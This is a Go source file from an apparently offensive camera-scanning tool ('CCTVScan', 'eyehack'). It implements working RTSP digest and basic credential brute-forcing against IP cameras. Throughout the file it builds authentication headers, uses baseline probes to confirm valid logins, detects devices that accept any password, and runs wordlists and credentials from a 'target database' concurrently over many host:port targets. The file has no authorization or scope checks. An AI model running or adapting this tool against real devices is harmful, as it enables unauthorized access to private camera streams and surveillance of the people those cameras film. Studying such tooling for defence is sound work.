package credbrute

// RTSP credential testing.
//
// The HTTP brute force cannot reach the majority of cameras' real attack
// surface: RTSP streams are protected by their own digest challenge, which is
// computed locally with MD5 and is therefore NOT subject to the client-side
// hashing that makes web login forms unbruteable.
//
// The false-positive discipline learned the hard way on HTTP applies here too:
// a credential is only reported when a deliberately-wrong baseline gets 401 and
// the candidate gets 200 on the very same URL. Two baselines must agree, or the
// endpoint is refused entirely.

import (
	"bufio"
	"context"
	"crypto/md5"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"
)

// RTSP outcome codes.
const (
	RTSPPublic   = "public"   // no credentials needed, stream answers unauthenticated
	RTSPCreds    = "creds"    // credentials found: 401 baseline -> 200 candidate
	RTSPNone     = "none"     // endpoint never challenged, nothing to test
	RTSPUnstable = "unstable" // baselines disagreed or baseline itself succeeded
	// RTSPAnyPassword means the device validates the username but accepts any
	// password at all: the stream is reachable, but no credential can be
	// claimed because the password we sent is not the device's password.
	RTSPAnyPassword = "any_password"
	RTSPLocked      = "locked" // device reported a lockout, attempts stopped
	RTSPError       = "error"  // connection/protocol failure
)

// RTSPResult is what one host:port yielded.
type RTSPResult struct {
	URL        string `json:"url"`
	Outcome    string `json:"outcome"`
	Credential string `json:"credential,omitempty"`
	Attempts   int    `json:"attempts"`
	Note       string `json:"note,omitempty"`
}

// rtspChallenge is a parsed WWW-Authenticate header.
type rtspChallenge struct {
	scheme    string // "digest" or "basic"
	realm     string
	nonce     string
	qop       string
	algorithm string
	opaque    string
}

// splitAuthParams splits `k="v", k2=v2` honouring double quotes.
func splitAuthParams(s string) []string {
	var out []string
	var cur strings.Builder
	inQuote := false
	for _, r := range s {
		switch {
		case r == '"':
			inQuote = !inQuote
			cur.WriteRune(r)
		case r == ',' && !inQuote:
			out = append(out, cur.String())
			cur.Reset()
		default:
			cur.WriteRune(r)
		}
	}
	if strings.TrimSpace(cur.String()) != "" {
		out = append(out, cur.String())
	}
	return out
}

// parseWWWAuthenticate parses one WWW-Authenticate value.
func parseWWWAuthenticate(v string) *rtspChallenge {
	v = strings.TrimSpace(v)
	if v == "" {
		return nil
	}
	i := strings.IndexByte(v, ' ')
	if i < 0 {
		return &rtspChallenge{scheme: strings.ToLower(v)}
	}
	ch := &rtspChallenge{scheme: strings.ToLower(strings.TrimSpace(v[:i]))}
	for _, part := range splitAuthParams(v[i+1:]) {
		kv := strings.SplitN(part, "=", 2)
		if len(kv) != 2 {
			continue
		}
		k := strings.ToLower(strings.TrimSpace(kv[0]))
		val := strings.Trim(strings.TrimSpace(kv[1]), `"`)
		switch k {
		case "realm":
			ch.realm = val
		case "nonce":
			ch.nonce = val
		case "qop":
			ch.qop = val
		case "algorithm":
			ch.algorithm = val
		case "opaque":
			ch.opaque = val
		}
	}
	return ch
}

// pickChallenge prefers digest (the common RTSP scheme) over basic.
func pickChallenge(values []string) *rtspChallenge {
	var fallback *rtspChallenge
	for _, v := range values {
		ch := parseWWWAuthenticate(v)
		if ch == nil {
			continue
		}
		if ch.scheme == "digest" && ch.nonce != "" {
			return ch
		}
		if fallback == nil {
			fallback = ch
		}
	}
	return fallback
}

func md5hex(s string) string {
	sum := md5.Sum([]byte(s))
	return hex.EncodeToString(sum[:])
}

// firstQOP picks qop=auth out of a possibly comma separated qop list;
// auth-int is never used by cameras and would require hashing the body.
func firstQOP(qop string) string {
	for _, p := range strings.Split(qop, ",") {
		if strings.TrimSpace(p) == "auth" {
			return "auth"
		}
	}
	return ""
}

func randomHex(n int) string {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return "0123456789abcdef0123456789abcdef"
	}
	return hex.EncodeToString(b)
}

// digestResponse computes the RFC 7616 response for one attempt.
func digestResponse(method, uri string, ch *rtspChallenge, user, pass, cnonce, nc string) string {
	ha1 := md5hex(user + ":" + ch.realm + ":" + pass)
	if strings.EqualFold(ch.algorithm, "md5-sess") {
		ha1 = md5hex(ha1 + ":" + ch.nonce + ":" + cnonce)
	}
	ha2 := md5hex(method + ":" + uri)
	if qop := firstQOP(ch.qop); qop != "" {
		return md5hex(ha1 + ":" + ch.nonce + ":" + nc + ":" + cnonce + ":" + qop + ":" + ha2)
	}
	return md5hex(ha1 + ":" + ch.nonce + ":" + ha2)
}

// authorizationFor builds the Authorization header for one credential.
func authorizationFor(method, uri string, ch *rtspChallenge, user, pass string) string {
	if ch == nil {
		return ""
	}
	if ch.scheme == "basic" {
		return "Basic " + base64.StdEncoding.EncodeToString([]byte(user+":"+pass))
	}
	cnonce := randomHex(8)
	nc := "00000001"
	resp := digestResponse(method, uri, ch, user, pass, cnonce, nc)

	var b strings.Builder
	b.WriteString("Digest username=\"")
	b.WriteString(user)
	b.WriteString("\", realm=\"")
	b.WriteString(ch.realm)
	b.WriteString("\", nonce=\"")
	b.WriteString(ch.nonce)
	b.WriteString("\", uri=\"")
	b.WriteString(uri)
	b.WriteString("\", response=\"")
	b.WriteString(resp)
	b.WriteString("\"")
	if qop := firstQOP(ch.qop); qop != "" {
		b.WriteString(", qop=")
		b.WriteString(qop)
		b.WriteString(", nc=")
		b.WriteString(nc)
		b.WriteString(", cnonce=\"")
		b.WriteString(cnonce)
		b.WriteString("\"")
	}
	if ch.algorithm != "" {
		b.WriteString(", algorithm=")
		b.WriteString(ch.algorithm)
	}
	if ch.opaque != "" {
		b.WriteString(", opaque=\"")
		b.WriteString(ch.opaque)
		b.WriteString("\"")
	}
	return b.String()
}

// rtspResponse is the parts of an RTSP reply we need.
type rtspResponse struct {
	status    int
	authLines []string
	body      string
}

// rtspExchange performs exactly one request on a fresh connection. Opening a
// new socket per attempt mirrors DisableKeepAlives on the HTTP side: no server
// side session state can make two attempts look different for the wrong reason.
func rtspExchange(ctx context.Context, addr, uri, method, auth string, timeout time.Duration) (rtspResponse, error) {
	var res rtspResponse

	d := net.Dialer{Timeout: timeout}
	conn, err := d.DialContext(ctx, "tcp", addr)
	if err != nil {
		return res, err
	}
	defer conn.Close()

	deadline := time.Now().Add(timeout)
	if dl, ok := ctx.Deadline(); ok && dl.Before(deadline) {
		deadline = dl
	}
	_ = conn.SetDeadline(deadline)

	var req strings.Builder
	req.WriteString(method)
	req.WriteString(" ")
	req.WriteString(uri)
	req.WriteString(" RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: CCTVScan/1.0\r\nAccept: application/sdp\r\n")
	if auth != "" {
		req.WriteString("Authorization: ")
		req.WriteString(auth)
		req.WriteString("\r\n")
	}
	req.WriteString("Connection: close\r\n\r\n")

	if _, err := io.WriteString(conn, req.String()); err != nil {
		return res, err
	}
	return readRTSPResponse(conn)
}

// readRTSPResponse parses a status line, headers and an optional body.
// Without Content-Length no body is read — waiting for EOF would burn the whole
// request timeout on servers that keep the socket open, and the status code is
// the signal we actually act on.
func readRTSPResponse(r io.Reader) (rtspResponse, error) {
	var res rtspResponse
	br := bufio.NewReaderSize(r, 8192)

	line, err := br.ReadString('\n')
	if err != nil {
		return res, err
	}
	line = strings.TrimRight(line, "\r\n")
	fields := strings.Fields(line)
	if len(fields) < 2 {
		return res, fmt.Errorf("bad RTSP status line %q", line)
	}
	// Squatters answer HTTP on the RTSP port; reading their 200 as an open
	// stream would be fiction, so the protocol must be confirmed first.
	if !strings.HasPrefix(strings.ToUpper(fields[0]), "RTSP/") {
		return res, fmt.Errorf("not an RTSP reply: %q", line)
	}
	code, err := strconv.Atoi(fields[1])
	if err != nil {
		return res, fmt.Errorf("bad RTSP status %q", line)
	}
	res.status = code

	contentLen := -1
	for {
		h, err := br.ReadString('\n')
		if err != nil {
			break
		}
		h = strings.TrimRight(h, "\r\n")
		if h == "" {
			break
		}
		i := strings.IndexByte(h, ':')
		if i < 0 {
			continue
		}
		k := strings.ToLower(strings.TrimSpace(h[:i]))
		v := strings.TrimSpace(h[i+1:])
		switch k {
		case "www-authenticate":
			res.authLines = append(res.authLines, v)
		case "content-length":
			contentLen, _ = strconv.Atoi(v)
		}
	}

	if contentLen > 0 {
		buf := make([]byte, contentLen)
		if _, err := io.ReadFull(br, buf); err == nil {
			res.body = string(buf)
		}
	}
	return res, nil
}

// GroupRTSPURLs buckets raw rtsp:// URLs by host:port so credentials are tried
// once per device instead of once per path.
func GroupRTSPURLs(urls []string) map[string][]string {
	groups := make(map[string][]string)
	seen := make(map[string]map[string]bool)
	for _, raw := range urls {
		u, err := url.Parse(strings.TrimSpace(raw))
		if err != nil || u.Scheme != "rtsp" || u.Host == "" {
			continue
		}
		port := u.Port()
		if port == "" {
			port = "554"
		}
		key := net.JoinHostPort(u.Hostname(), port)
		if seen[key] == nil {
			seen[key] = make(map[string]bool)
		}
		path := u.Path
		if path == "" {
			path = "/"
		}
		if u.RawQuery != "" {
			path += "?" + u.RawQuery
		}
		if seen[key][path] {
			continue
		}
		seen[key][path] = true
		// The request URI must be absolute for RTSP.
		groups[key] = append(groups[key], "rtsp://"+u.Host+path)
	}
	return groups
}

// rtspAddr returns the dial address for an absolute rtsp:// URI.
func rtspAddr(raw string) string {
	u, err := url.Parse(raw)
	if err != nil || u.Host == "" {
		return ""
	}
	port := u.Port()
	if port == "" {
		port = "554"
	}
	return net.JoinHostPort(u.Hostname(), port)
}

// baselineRTSPUser/baselineRTSPPass cannot plausibly be valid credentials.
const (
	baselineRTSPUser = "eyehack-baseline-user-9f3a7c1"
	baselineRTSPPass = "eyehack-baseline-pass-b72d4e8a"
)

// RTSPBruteForce tests credentials against one host:port. urls holds the paths
// discovered for it; the first path that answers 200 (public) or challenges
// with 401 becomes the target, the rest are only fallbacks.
//
// A credential is returned only when the very same username was rejected with
// a deliberately-wrong password immediately beforehand (401) and the candidate
// then gets 200 — the status change is the proof. An impossible username alone
// proves nothing: cameras accept any password for a user they recognise.
func RTSPBruteForce(ctx context.Context, urls []string, credFile string, timeout time.Duration) RTSPResult {
	return RTSPBruteForceKnown(ctx, urls, credFile, nil, timeout)
}

// RTSPBruteForceKnown is RTSPBruteForce with credentials already known for
// this endpoint (from the target database): they are tested before the
// wordlist, which may be empty or missing when known holds everything.
func RTSPBruteForceKnown(ctx context.Context, urls []string, credFile string, known []string, timeout time.Duration) RTSPResult {
	creds, err := loadCredentials(credFile)
	creds = prependKnown(creds, known)
	if err != nil && len(known) == 0 {
		return RTSPResult{Outcome: RTSPError, Note: errString(err)}
	}
	if len(urls) == 0 {
		return RTSPResult{Outcome: RTSPError, Note: errString(err)}
	}

	// Find an endpoint that actually talks RTSP to us.
	var (
		target  string
		chal    rtspResponse
		sawAuth bool
	)
	for _, raw := range urls {
		if ctx.Err() != nil {
			return RTSPResult{Outcome: RTSPError, Note: "cancelled"}
		}
		addr := rtspAddr(raw)
		if addr == "" {
			continue
		}
		resp, err := rtspExchange(ctx, addr, raw, "DESCRIBE", "", timeout)
		if err != nil {
			continue
		}
		switch {
		case resp.status == 200 && len(resp.authLines) > 0:
			// A 200 that still carries a challenge answers its own question.
			return RTSPResult{URL: raw, Outcome: RTSPUnstable,
				Note: "200 response carries a WWW-Authenticate challenge — refusing to guess"}
		case resp.status == 200:
			// Same discipline as a credential baseline: an endpoint that
			// answers 200 once and 401 the next time is not open, it is flaky.
			again, err := rtspExchange(ctx, addr, raw, "DESCRIBE", "", timeout)
			if err == nil && len(again.authLines) > 0 && again.status == 401 {
				// It does challenge after all — test credentials against it and
				// let the baselines decide whether its answers mean anything.
				target, chal = raw, again
				sawAuth = true
				break
			}
			if err == nil && again.status == 200 && len(again.authLines) == 0 {
				return RTSPResult{URL: raw, Outcome: RTSPPublic}
			}
			return RTSPResult{URL: raw, Outcome: RTSPUnstable,
				Note: "unauthenticated DESCRIBE answers inconsistently"}
		case resp.status == 401 && len(resp.authLines) > 0:
			target, chal = raw, resp
			sawAuth = true
		}
		if sawAuth {
			break
		}
	}
	if !sawAuth {
		return RTSPResult{Outcome: RTSPNone, Note: "no 401 challenge on any path"}
	}

	ch := pickChallenge(chal.authLines)
	if ch == nil || ch.scheme == "" {
		return RTSPResult{URL: target, Outcome: RTSPNone, Note: "401 without a usable challenge"}
	}

	addr := rtspAddr(target)

	// Baseline twice. If the endpoint does not answer two impossible
	// credentials the same way, its status code says nothing about what we
	// sent and no success can be claimed here.
	var base rtspResponse
	for i := 0; i < 2; i++ {
		r, err := rtspExchange(ctx, addr, target, "DESCRIBE",
			authorizationFor("DESCRIBE", target, ch, baselineRTSPUser, baselineRTSPPass), timeout)
		if err != nil {
			return RTSPResult{URL: target, Outcome: RTSPError, Note: "baseline unreachable"}
		}
		if i == 0 {
			base = r
			continue
		}
		if r.status != base.status {
			return RTSPResult{URL: target, Outcome: RTSPUnstable,
				Note: fmt.Sprintf("baselines disagree: %d vs %d", base.status, r.status)}
		}
	}
	if base.status == 200 {
		return RTSPResult{URL: target, Outcome: RTSPUnstable,
			Note: "baseline already accepted — endpoint ignores credentials"}
	}
	if base.status != 401 {
		return RTSPResult{URL: target, Outcome: RTSPNone,
			Note: fmt.Sprintf("baseline status %d, expected 401", base.status)}
	}

	// Per-username baseline — the check that actually proves the password was
	// tested. Real devices accept ANY password for a username they recognise
	// while answering 401 to unknown users, so the impossible-user baseline
	// above cannot detect that: the first candidate would look like a hit.
	// Before testing any password we make the endpoint reject the same
	// username with a wrong password. Probes are not credential guesses, so
	// they are not counted in Attempts.
	checkedUser := make(map[string]bool)
	untestable := 0
	transportErr := 0

	res := RTSPResult{URL: target}
	baselineStatus := func(user string) int {
		r, err := rtspExchange(ctx, addr, target, "DESCRIBE",
			authorizationFor("DESCRIBE", target, ch, user, baselineRTSPPass), timeout)
		if err != nil {
			return -1
		}
		return r.status
	}

	for _, cred := range creds {
		if ctx.Err() != nil {
			res.Outcome = RTSPError
			res.Note = "cancelled"
			return res
		}
		user, pass, ok := splitCred(cred)
		if !ok {
			continue
		}

		if !checkedUser[user] {
			checkedUser[user] = true
			s1, s2 := baselineStatus(user), baselineStatus(user)
			if s1 < 0 || s2 < 0 {
				// The device stopped answering mid-run (cameras commonly drop
				// connections after enough attempts). Skip this username
				// instead of abandoning the endpoint: everything tested up to
				// here stays valid and a later username may get through.
				untestable++
				continue
			}
			if s1 != s2 {
				return RTSPResult{URL: target, Outcome: RTSPUnstable,
					Note: fmt.Sprintf("baselines for user %q disagree: %d vs %d", user, s1, s2)}
			}
			if s1 == 200 {
				// Username recognised, password never checked: the stream is
				// reachable but nothing here is a verified credential.
				return RTSPResult{URL: target, Outcome: RTSPAnyPassword,
					Note: fmt.Sprintf("device accepts any password for user %q — stream reachable, no credential verified", user)}
			}
			if s1 != 401 {
				untestable++
				continue
			}
		}

		r, err := rtspExchange(ctx, addr, target, "DESCRIBE",
			authorizationFor("DESCRIBE", target, ch, user, pass), timeout)
		res.Attempts++
		if err != nil {
			transportErr++
			continue
		}
		if isLocked(r.body) {
			res.Outcome = RTSPLocked
			res.Note = "device reported a lockout"
			return res
		}
		if r.status == 200 {
			// This username was rejected with a wrong password moments ago,
			// so 200 here can only mean this password is the real one.
			res.Outcome = RTSPCreds
			res.Credential = cred
			return res
		}
		// 401 = wrong credential, keep going. Anything else (404, 403, 5xx)
		// is not a successful authentication on this path.
	}

	res.Outcome = RTSPNone
	if res.Attempts > 0 && transportErr == res.Attempts {
		res.Outcome = RTSPError
		res.Note = fmt.Sprintf("device stopped responding after %d attempts — no credential was actually tested", res.Attempts)
		return res
	}
	if res.Attempts == 0 {
		if untestable > 0 {
			res.Note = fmt.Sprintf("device stopped responding before any username could be baselined (%d untestable)", untestable)
		} else {
			res.Note = "no credential attempt was made"
		}
		return res
	}
	res.Note = fmt.Sprintf("no credential accepted in %d attempts", res.Attempts)
	if transportErr > 0 {
		res.Note += fmt.Sprintf(" — device stopped responding after %d failures", transportErr)
	}
	if untestable > 0 {
		res.Note += fmt.Sprintf(", %d username(s) untestable", untestable)
	}
	return res
}

func errString(err error) string {
	if err == nil {
		return "no urls"
	}
	return err.Error()
}

// BruteRTSPBatch runs RTSPBruteForce over many host:port groups concurrently
// and reports every result as it completes.
func BruteRTSPBatch(ctx context.Context, groups map[string][]string, credFile string,
	timeout time.Duration, workers int, onResult func(RTSPResult)) []RTSPResult {
	return BruteRTSPBatchKnown(ctx, groups, credFile, nil, timeout, workers, onResult)
}

// BruteRTSPBatchKnown is BruteRTSPBatch with credentials already known per
// group ("host:port" -> "user:pass" list, from the target database); they are
// tested before the wordlist of that group.
func BruteRTSPBatchKnown(ctx context.Context, groups map[string][]string, credFile string,
	known map[string][]string, timeout time.Duration, workers int, onResult func(RTSPResult)) []RTSPResult {

	if workers < 1 {
		workers = 16
	}
	keys := make([]string, 0, len(groups))
	for k := range groups {
		keys = append(keys, k)
	}

	var (
		mu      sync.Mutex
		wg      sync.WaitGroup
		sem     = make(chan struct{}, workers)
		results []RTSPResult
	)
	for _, k := range keys {
		wg.Add(1)
		go func(key string, urls []string) {
			defer wg.Done()
			select {
			case <-ctx.Done():
				return
			case sem <- struct{}{}:
			}
			defer func() { <-sem }()

			r := RTSPBruteForceKnown(ctx, urls, credFile, known[key], timeout)
			if r.URL == "" {
				r.URL = "rtsp://" + key
			}
			mu.Lock()
			results = append(results, r)
			if onResult != nil {
				onResult(r)
			}
			mu.Unlock()
		}(k, groups[k])
	}
	wg.Wait()
	return results
}
